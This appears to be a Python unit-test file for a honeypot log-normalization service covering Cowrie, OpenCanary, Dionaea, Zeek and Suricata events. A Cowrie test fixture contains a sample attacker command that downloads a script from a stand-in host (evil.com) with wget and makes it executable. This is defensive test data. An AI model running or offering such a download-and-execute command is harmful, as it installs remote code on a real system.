"""
Unit tests for log normalization across all 5 sources:
Cowrie, OpenCanary, Dionaea, Zeek, Suricata.
"""

from app.services import log_normalization


def test_normalize_cowrie_login_failed():
    raw = {
        "eventid": "cowrie.login.failed",
        "src_ip": "198.51.100.23",
        "dst_port": 2222,
        "username": "root",
        "password": "123456Password",
        "session": "a1b2c3d4",
        "timestamp": "2026-08-24T12:00:00.000000Z",
    }
    norm = log_normalization.normalize("cowrie", raw)
    assert norm is not None
    assert norm["source"] == "cowrie"
    assert norm["event_type"] == "login_attempt"
    assert norm["src_ip"] == "198.51.100.23"
    assert norm["username"] == "root"
    assert norm["password"] == "123456Password"
    assert norm["protocol"] == "ssh"
    assert norm["session_external_id"] == "a1b2c3d4"


def test_normalize_cowrie_command():
    raw = {
        "eventid": "cowrie.command.input",
        "src_ip": "198.51.100.23",
        "dst_port": 2222,
        "input": "wget http://evil.com/malware.sh -O /tmp/x; chmod +x /tmp/x",
        "session": "a1b2c3d4",
        "timestamp": "2026-08-24T12:01:00Z",
    }
    norm = log_normalization.normalize("cowrie", raw)
    assert norm is not None
    assert norm["event_type"] == "command"
    assert norm["command"] == "wget http://evil.com/malware.sh -O /tmp/x; chmod +x /tmp/x"


def test_normalize_opencanary_http():
    raw = {
        "logtype": 6001,
        "src_host": "203.0.113.55",
        "dst_port": 8080,
        "logdata": {"USERNAME": "admin", "PASSWORD": "password123"},
        "local_time": "2026-08-24 12:05:00",
    }
    norm = log_normalization.normalize("opencanary", raw)
    assert norm is not None
    assert norm["source"] == "opencanary"
    assert norm["event_type"] == "login_attempt"
    assert norm["src_ip"] == "203.0.113.55"
    assert norm["username"] == "admin"


def test_normalize_dionaea():
    raw = {
        "connection": {
            "remote_ip": "192.0.2.88",
            "local_port": 445,
            "protocol": "smbd",
        },
        "timestamp": 1724500000,
    }
    norm = log_normalization.normalize("dionaea", raw)
    assert norm is not None
    assert norm["source"] == "dionaea"
    assert norm["event_type"] == "malware_interaction"
    assert norm["src_ip"] == "192.0.2.88"
    assert norm["protocol"] == "smbd"


def test_normalize_zeek():
    raw = {
        "id.orig_h": "198.51.100.99",
        "id.resp_h": "192.168.1.50",
        "id.resp_p": 8080,
        "proto": "tcp",
        "ts": 1724500100.5,
    }
    norm = log_normalization.normalize("zeek", raw)
    assert norm is not None
    assert norm["source"] == "zeek"
    assert norm["src_ip"] == "198.51.100.99"
    assert norm["dst_port"] == 8080


def test_normalize_suricata_alert():
    raw = {
        "event_type": "alert",
        "src_ip": "198.51.100.77",
        "dest_port": 8080,
        "proto": "TCP",
        "alert": {"signature": "HSX SQL injection attempt against honeypot HTTP service"},
        "timestamp": "2026-08-24T12:10:00.000000+0000",
    }
    norm = log_normalization.normalize("suricata", raw)
    assert norm is not None
    assert norm["source"] == "suricata"
    assert norm["event_type"] == "ids_alert"
    assert norm["ids_signature"] == "HSX SQL injection attempt against honeypot HTTP service"


def test_normalize_suricata_flow_ignored():
    raw = {"event_type": "flow", "src_ip": "1.2.3.4"}
    norm = log_normalization.normalize("suricata", raw)
    assert norm is None
